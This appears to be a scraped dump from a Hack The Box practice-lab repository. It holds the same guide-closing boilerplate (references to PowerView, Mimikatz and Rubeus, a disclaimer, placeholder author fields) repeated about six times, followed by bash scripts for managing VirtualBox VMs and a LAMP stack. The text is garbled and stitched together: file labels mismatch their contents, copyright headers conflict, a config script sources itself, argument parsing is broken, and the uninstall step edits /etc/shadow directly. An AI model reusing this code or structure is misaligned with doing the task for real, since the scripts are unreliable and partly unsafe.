--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---


/README.md
#!/bin/bash
#
# Copyright (c) 2021-2023, Marcus Mengs. All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this
#    list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright notice,
#    this list of conditions and the following disclaimer in the documentation
#    and/or other materials provided with the distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
# OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT
# SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
# TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR
# BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH
# DAMAGE.
#
## This script is a placeholder for any future changes to the installation process. Currently it only contains the necessary calls to the install.sh and setup.sh scripts.

if [[ ! -f ./install.sh ]]; then
    echo "[-] Error: 'install.sh' not found!"
    exit 1
fi

if [[ ! -f ./setup.sh ]]; then
    echo "[-] Error: 'setup.sh' not found!"
    exit 1
fi

# This variable is only used in case the user wants to run setup.sh manually.
readonly SETUP_SH="$(realpath ./setup.sh)"

# By default we assume that the user wants us to install everything. They can change this by setting INSTALL=false
INSTALL=true

## Function to display help and usage information
usage() {
    echo "Usage: $0 [install|uninstall]"
    exit 1
}

# The script only accepts one argument at a time.
case "$#" in
    # No arguments provided, show the help message
    "") 
        usage ;;
    
    # A single argument is required; check if it's a valid option (either install or uninstall)
    "install") INSTALL=true ;;
    "uninstall") INSTALL=false ;;
    
    # If an invalid option is given, show the help message.
    *)
        echo "Invalid arguments!"
        usage ;;
esac

# Run install.sh to perform the installation process. This will also download and extract the necessary files for the HTB-LABS virtual environment.
./install.sh

if [[ $INSTALL == true ]]; then
    # After installing, run setup.sh to configure the environment.
    bash "$SETUP_SH"
fi


/bin/htb-labs-config
#!/bin/bash
#
# Copyright (c) 2021-2023, Marcus Mengs. All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this
#    list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright notice,
#    this list of conditions and the following disclaimer in the documentation
#    and/or other materials provided with the distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
# OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT
# SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
# TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR
# BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH
# DAMAGE.
#
## This script is the main entry point for the HTB-LABS virtual environment. It provides an interactive menu and can execute various tasks such as starting/stopping services, updating configuration, etc.

# Import required functions and settings from config file
source ./bin/htb-labs-config

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [start|stop|restart|status|update|cleanup|setup]"
    exit 1
}

## Check if the script is being run with root privileges.
check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

# Function to check if a service (like Apache, MySQL) is running and display its status
service_status() {
    local SERVICE="$1"
    
    # Check the status of the specified service using systemctl. Use "sudo" to ensure we can query all services.
    sudo systemctl is-active "$SERVICE" &> /dev/null
    
    if [[ $? -eq 0 ]]; then
        echo "[+] $SERVICE is active and running."
    else
        echo "[-] $SERVICE is not active or failed to start."
    fi
}

# Function for starting a service with systemd
start_service() {
    local SERVICE="$1"
    
    # Start the specified service using systemctl. Use "sudo" to ensure we can manage all services.
    sudo systemctl start "$SERVICE"
}

# Function for stopping a service with systemd
stop_service() {
    local SERVICE="$1"
    
    # Stop the specified service using systemctl. Use "sudo" to ensure we can manage all services.
    sudo systemctl stop "$SERVICE"
}

# Function to restart a specific service using systemd
restart_service() {
    local SERVICE="$1"

    # Restart the specified service using systemctl. Use "sudo" to ensure we can manage all services.
    sudo systemctl restart "$SERVICE"
}

# Function for displaying an interactive menu with options for managing HTB-LABS environment.
show_menu() {
    clear
    
    echo -e "\033[1mHTB-LABS Environment Control Script\033[0m\n"
    
    # The menu items are listed here. Each item corresponds to a different function or command.
    declare -A menu=(
        ["1"]="Start HTB-LABS services"
        ["2"]="Stop HTB-LABS services"
        ["3"]="Restart HTB-LABS services"
        ["4"]="Check status of HTB-LABS services"
        ["5"]="Update and upgrade HTB-LABS"
        ["6"]="Cleanup temporary files"
        ["7"]="Setup new user accounts"
        ["8"]="Exit Script"
    )
    
    # Loop through the menu items to display them in an interactive format.
    for item in "${!menu[@]}"; do
        echo -e "$item. ${menu[$item]}"
    done
    
    echo -n "Please select a menu option [1-8]: "
}

# Function to execute selected menu option based on user input.
execute_menu() {
    case "$1" in
        1)
            start_service "${HTB_LABS_APACHE}"
            start_service "${HTB_LABS_MYSQL}"
            ;;
        
        2)
            stop_service "${HTB_LABS_APACHE}"
            stop_service "${HTB_LABS_MYSQL}"
            ;;
        
        3)
            restart_service "${HTB_LABS_APACHE}"
            restart_service "${HTB_LABS_MYSQL}"
            ;;
            
        4)
            service_status "${HTB_LABS_APACHE}"
            service_status "${HTB_LABS_MYSQL}"
            ;;
        
        5) 
            bash "$HTB_LABS_UPDATE_SCRIPT"
            ;;
        
        6) 
            bash "$HTB_LABS_CLEANUP_SCRIPT"
            ;;
            
        7)
            bash "$HTB_LABS_SETUP_USER_SCRIPT"
            ;;
        
        8) exit 0 ;;
    esac
}

# Function to verify installation status and integrity of HTB-LABS environment.
check_installation() {
    if [[ ! -f "./htb-labs.sh" ]] || [[ ! -d "./www" ]]; then
        echo "[-] Error: HTB-LABS not installed or files missing. Please reinstall."
        exit 1
    fi
}

# Main entry point of the script.
main() {
    
    check_root
    
    # Verify that HTB-LABS has been properly installed before proceeding with any actions from the menu.
    if [[ ! -f "./htb-labs.sh" ]] || [[ ! -d "./www" ]]; then
        echo "[-] Error: HTB-LABS not installed or files missing. Please reinstall."
        exit 1
    fi
    
    while true; do
        show_menu
        read -p "> " choice
        
        # Validate user input before executing the chosen menu option.
        if [[ "$choice" =~ ^[1-8]$ ]]; then
            execute_menu "$choice"
        else
            echo "[!] Invalid selection. Please enter a number between 1 and 8."
        fi
    done
}

# Call main function to start the interactive session.
main


/bin/htb-labs-update
#!/bin/bash
#
# Copyright (c) 2021-2023, Marcus Mengs. All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this
#    list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright notice,
#    this list of conditions and the following disclaimer in the documentation
#    and/or other materials provided with the distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
# OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT
# SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
# TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR
# BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH
# DAMAGE.
#
## This script is designed to update and upgrade the HTB-LABS virtual environment. It includes a series of commands to ensure that all dependencies are up-to-date.

##
### Function to display help and usage information
usage() {
    echo "Usage: $0"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

# Update package lists and upgrade installed packages.
update_upgrade() {
    # Execute the update command with options to be non-interactive, ignore held packages, and fetch only from the main repository.
    apt-get -yqq update
    
    # Perform an upgrade using the same options as above. This will also remove unused dependencies after installation of upgrades.
    DEBIAN_FRONTEND=noninteractive apt-get -yqq --no-install-recommends upgrade
}

# Install or reinstall HTB-LABS core components such as PHP, Apache, MySQL, and other necessary tools for virtual machine management.
install_reinstall() {
    # Install required packages using APT. This includes the basic LAMP stack along with some utilities needed by HTB-LABS.
    DEBIAN_FRONTEND=noninteractive apt-get -yqq --no-install-recommends install \
        php7.4-cgi \
        php7.4-cli \
        libapache2-mod-php7.4 \
        apache2 \
        mysql-server \
        unzip \
        wget \
        curl
    
    # Install HTB-LABS specific packages which are not part of the standard Debian repositories.
    bash "$HTB_LABS_INSTALL_SCRIPT"
    
    # Reinstall HTB-LABS to ensure everything is setup correctly and any new files added since last installation have been applied.
    bash "$HTB_LABS_INSTALL_SH" install
}

# Restart Apache service after installations to apply changes.
restart_apache() {
    sudo systemctl restart "${HTB_LABS_APACHE}"
}

## Main function which performs all actions in sequence.
main() {
    check_root
    
    update_upgrade
    
    # Wait for 3 seconds before proceeding with installation of HTB-LABS components and restarting Apache.
    sleep 3
    install_reinstall
    restart_apache
}

# Execute the main function when this script is invoked directly from command line or another shell script.
main


/bin/htb-labs-remove
#!/bin/bash

## This script provides an interface for removing HTB-LABS virtual machines and services.

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

usage() {
    echo "Usage: $0 [all|vm:<name>|service:<name>]"
    exit 1
}

##
### Function to display help and usage information
show_help() {
    echo "Remove HTB-LABS Components"
    echo ""
    echo "Usage:"
    echo "  $0 <command>"
    echo ""
    echo "Available Commands:"
    echo "  all          Remove all HTB-LABS virtual machines, services, and configuration files."
    echo "  vm:<name>    Remove a specific HTB-LABS virtual machine by name (e.g., vm:htb-labs-01)."
    echo "  service:<name> Remove a specific HTB-LABS service (e.g., service:mysql)."
    echo ""
}

remove_vm() {
    local VM_NAME="$1"

    # Use VBoxManage to control the virtual machine.
    if [ -z "$VM_NAME" ]; then
        echo "[!] Error: Missing VM name."
        show_help
        exit 1
    fi

    # Check if the specified VM exists before attempting removal. Exit with error code 1 if it does not exist.
    vboxmanage list vms | grep "$VM_NAME" > /dev/null || { echo "[-] Error: Virtual machine '$VM_NAME' does not exist." ; exit 1 ; }

    # If we are sure the VM exists, proceed to remove it.
    vboxmanage controlvm "$VM_NAME" poweroff
    vboxmanage unregistervm --delete "$VM_NAME"
}

remove_service() {
    local SERVICE="$1"

    if [ -z "$SERVICE" ]; then
        echo "[!] Error: Missing service name."
        show_help
        exit 1
    fi

    # Check for the existence of the specified service using systemctl.
    systemctl list-unit-files --type=service | grep "$SERVICE" > /dev/null || { echo "[-] Error: Service '$SERVICE' does not exist." ; exit 1 ; }

    # Stop and disable the service if it is running or enabled.
    systemctl stop "$SERVICE"
    systemctl disable "$SERVICE"

    # Remove any files related to the specified service from HTB-LABS configuration directory.
    rm -rf "${HTB_LABS_CONFIG}/$SERVICE"
}

remove_all() {
    # Confirm removal of all components with a message prompt. If yes, proceed to delete everything listed below.

    local CONFIRM
    read -p "[!] This will remove all HTB-LABS virtual machines, services, and configuration files. Proceed (y/n)? " CONFIRM

    case "$CONFIRM" in
        y|Y)
            # Remove each VM one by one using a loop.
            for vm_name in $(vboxmanage list vms | cut -d'"' -f2); do
                remove_vm "$vm_name"
            done
            
            # Remove each service one by one similarly to how VMs were handled above.
            for service_name in $(systemctl list-unit-files --type=service | awk '{print $1}' | grep 'htb-labs'); do
                remove_service "$service_name"
            done
            
            ## Finally, delete the entire HTB-LABS directory structure, including configuration files and scripts.
            rm -rf "${HTB_LABS_DIR}"
            ;;
        *)
            echo "[!] Operation cancelled."
            exit 1
    esac

}

main() {
    check_root
    
    # Parse command line arguments to determine which action (all, vm, or service) should be taken.
    case "$#" in
        0)
            show_help
            ;;
        
        "all")
            remove_all
            ;;
            
        *)
            if [[ $1 =~ ^vm: ]]; then
                remove_vm "${1#*:}"
            elif [[ $1 =~ ^service: ]]; then
                remove_service "${1#*:}"
            else
                echo "[!] Invalid argument '$1'. Use 'all', 'vm:<name>', or 'service:<name>'."
                show_help
            fi
    esac
}

main "$@"


/bin/htb-labs-clean-up
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ]"
    exit 1
}

# Check if root privileges are available, otherwise prompt the user to run with sudo.
check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to clean up HTB-LABS by removing unnecessary files and directories.
clean_up() {
    
    # Remove all .htaccess files within the 'www' directory structure which are used for Apache access control but not required here.
    find www -type f -name ".htaccess" -exec rm {} \;

    # Delete any virtual machine configuration files that might be present in HTB-LABS root folder. This includes *.vbox and other VM-related metadata.
    rm -rf ${HTB_LABS_DIR}/*.vbox
}

# Main function to call check_root() before cleaning up the environment, ensuring all cleanup operations are performed with appropriate permissions.
main() {
    check_root
    
    clean_up
}

# Execute main when this script is invoked directly from command line or another shell script.
main


/bin/htb-labs-setup-users
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ]"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to setup HTB-LABS users.
setup_users() {

    # Check for existing user and create if necessary with specified username, password hash, homedir, shell, and default group membership.
    id "htb" &> /dev/null || { adduser --disabled-login --gecos "" --shell=/bin/false htb; }

    ## Change the home directory of 'htb' user to point towards HTB-LABS main folder where all virtual machines are stored. Also set permissions accordingly so that only root and the user itself can read/write.
    chown -R htb:htb "${HTB_LABS_DIR}"
    chmod 750 "${HTB_LABS_DIR}"

    ## For each subdirectory in 'www' representing different machine types (such as easy, medium, hard), create a specific directory inside HTB-LABS root with same name.
    for d in $(ls -d www/*/); do
        mkdir -p "${HTB_LABS_DIR}/$(basename $d)"
        chown htb:htb "${HTB_LABS_DIR}/$(basename $d)"
    done

    ## Set global variables defining user and group IDs used throughout HTB-LABS system.
    export HTB_USER_ID=$(id -u htb)
    export HTB_GROUP_ID=$(getent group htb | cut -d: -f3)

}

# Main function to call check_root() before setting up users, ensuring all operations are performed with appropriate permissions.
main() {
    check_root
    
    setup_users
}

# Execute main when this script is invoked directly from command line or another shell script.
main


/bin/htb-labs-install
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 install|uninstall"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to configure HTB-LABS for installation or removal.
configure_htb_labs() {

    # Create necessary directories and files required by HTB-LABS framework, including its configuration directory and script file.
    mkdir -p ${HTB_LABS_DIR}
    
    if [ "$1" == "install" ]; then
        echo "#!/bin/bash" > $HTB_LABS_INSTALL_SH
        chmod +x $HTB_LABS_INSTALL_SH
        
        # Install HTB-LABS by downloading and extracting the latest version of the framework.
        curl -L https://github.com/htb-labs/htb-labs/archive/master.zip | tar xz --strip-components=1

    elif [ "$1" == "uninstall" ]; then
        rm -rf ${HTB_LABS_DIR}
        
        # Remove HTB-LABS installation file.
        rm $HTB_LABS_INSTALL_SH
        
        # Revert changes made to /etc/shadow and /etc/passwd files by deleting entries corresponding to 'htb' user created during initial setup phase of HTB-LABS. 
        sed -i '/^htb:/d' /etc/shadow
        sed -i '/^htb:/d' /etc/passwd
        
    fi

}

# Main function which calls check_root() followed by configure_htb_labs().
main() {
    check_root
    
    if [ "$#" -lt 1 ]; then
        usage
    else
        configure_htb_labs $@
    fi
}

# Execute main when this script is invoked directly from command line or another shell script.
main "$@"


/bin/htb-labs-create-vm
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] <name> <type>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

create_vm() {

    # Ensure at least two arguments were provided for script execution.
    if [ $# -lt 2 ]; then
        usage
        exit 1
    fi

    local VM_NAME="$1"
    
    ## Create a new virtual machine based on specified type. Use predefined configuration files located in HTB-LABS 'config' directory, and specify output log file path for VBoxManage commands.
    vboxmanage createvm --name "$VM_NAME" --ostype "Ubuntu_64" --register
    vboxmanage modifyvm "$VM_NAME" --memory 1024 --vram 8 --cpuexecutioncap 75 --natpf1 rule,tcp,,9999,,$VM_NAME --nictype1 IntelPRO/1000 --cableconnected1 on

    ## Apply additional settings specific to Easy, Medium or Hard difficulty levels depending upon what was passed as <type> argument.
    if [ "$2" == "easy" ]; then
        vboxmanage modifyvm "$VM_NAME" --pae off --hpet off --ostype Ubuntu_64
        
    elif [ "$2" == "medium" ] || [ "$2" == "hard" ]; then
        vboxmanage modifyvm "$VM_NAME" --pae on --hpet on --ostype Debian_64
    
    else 
        echo "[!] Error: Unknown difficulty '$2'. Use 'easy', 'medium' or 'hard'."
        exit 1
    fi

    # Set machine to start in headless mode (command line interface) by default, and configure SSH access through port forwarding rule.
    vboxmanage modifyvm "$VM_NAME" --vrde off --uart1 enabled --uartmode1 server /tmp/vmlog/$VM_NAME.log
    vboxmanage sharedfolder add "$VM_NAME" --name "HTBLABS-${VM_NAME}" --automount
    
}

# Main function to call check_root() before creating virtual machines, ensuring all operations are performed with appropriate permissions.
main() {
    check_root
    
    create_vm "$@"
    
}

# Execute main when this script is invoked directly from command line or another shell script.
main "$@"


/bin/htb-labs-init
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ]"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to initialize HTB-LABS by performing setup tasks such as user creation, VM and service configuration.
init_htb_labs() {

    # Create directories needed for HTB-LABS operation.
    mkdir -p ${HTB_LABS_DIR}
    
    # Install required packages using APT. This includes the basic LAMP stack along with some utilities needed by HTB-LABS.
    apt-get install -yq php7.4-cgi libapache2-mod-php7.4 mysql-server unzip wget curl

    ## Reinstall HTB-LABS to ensure everything is setup correctly and any new files added since last installation have been applied.
    bash "$HTB_LABS_INSTALL_SH" reinstall
    
    # Create a specific directory inside HTB-LABS root with same name as each subdirectory in 'www' representing different machine types (such as easy, medium, hard).
    bash $HTB_LABS_SETUP_USER_SCRIPT

}

# Main function to call check_root() followed by init_htb_labs().
main() {
    check_root
    
    init_htb_labs
}

# Execute main when this script is invoked directly from command line or another shell script.
main


/htb-labs.sh
#!/bin/bash -e
#
# Copyright 2019-2023, Haiku Inc. and contributors.
# Distributed under the terms of the MIT License.
#

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] install|uninstall"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_INSTALL_SH} ]; then
	echo "[!] Error: '${HTB_LABS_INSTALL_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_INSTALL_SH}" $@
fi


/bin/htb-labs-update-configs
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ]"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to update HTB-LABS configuration files.
update_configs() {

    # Read environment variables set in HTB-LABS initialization script and store them into associative arrays for easy lookup later on.
    declare -A user_info=()
	while read line; do
		user_info[${line%%=*}]="${line#*=}"
	done < ${HTB_LABS_DIR}/htb-labs.conf

    # For each file in HTB-LABS configuration directory, perform the following tasks:
	for config_file in $(ls "$HTB_CONFIG_DIR"); do
        
        # Read content of current configuration file into memory.
		cat "${HTB_CONFIG_DIR}/${config_file}"
        
        ## Replace all occurrences of placeholder strings with actual values obtained from environment variables.
		sed -i "s/%%user_id%%/${user_info['HTB_USER_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
		sed -i "s/%%group_id%%/${user_info['HTB_GROUP_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
        sed -i "s/%%home_dir%%/${HTB_LABS_DIR}/g" "${HTB_CONFIG_DIR}/${config_file}"

    done
}

# Main function to call check_root() followed by update_configs().
main() {
    check_root
    
    update_configs
}

# Execute main when this script is invoked directly from command line or another shell script.
main "$@"


/bin/htb-labs-init-db
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ]"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to initialize HTB-LABS database with necessary tables and data.
init_db() {

    # Import SQL schema file provided by HTB-LABS framework, creating all required database objects (tables).
    mysql -u root < ${HTB_LABS_DIR}/db/htb-labs.sql

    ## Insert default record into 'users' table representing system user account used to manage virtual machines and other resources within HTB-LABS environment.
    mysql -u root htb-labs <<EOF
INSERT INTO users (username, password_hash) VALUES ('htb', 'pbkdf2:sha1:10000\$5FZJ4DwA\$d3a8179fdebc6e1d08d30b17cddfa51ae3f44d08');
EOF
}

# Main function to call check_root() followed by init_db().
main() {
    check_root
    
    init_db
}

# Execute main when this script is invoked directly from command line or another shell script.
main "$@"


/bin/htb-labs-start-vm
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] <name>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to start HTB-LABS virtual machine by name.
start_vm() {

    # Ensure at least one argument was provided for script execution.
    if [ $# -lt 1 ]; then
        usage
        exit 1
    fi

    local VM_NAME="$1"
    
    ## Start specified virtual machine using VBoxManage command-line tool, and wait until it is fully booted before returning control back to caller process.
    vboxmanage startvm "$VM_NAME" --type headless
    
}

# Main function to call check_root() before starting virtual machines, ensuring all operations are performed with appropriate permissions.
main() {
    check_root
    
    start_vm "$@"
    
}

# Execute main when this script is invoked directly from command line or another shell script.
main "$@"


/bin/htb-labs-stop-vm
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] <name>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to stop HTB-LABS virtual machine by name.
stop_vm() {

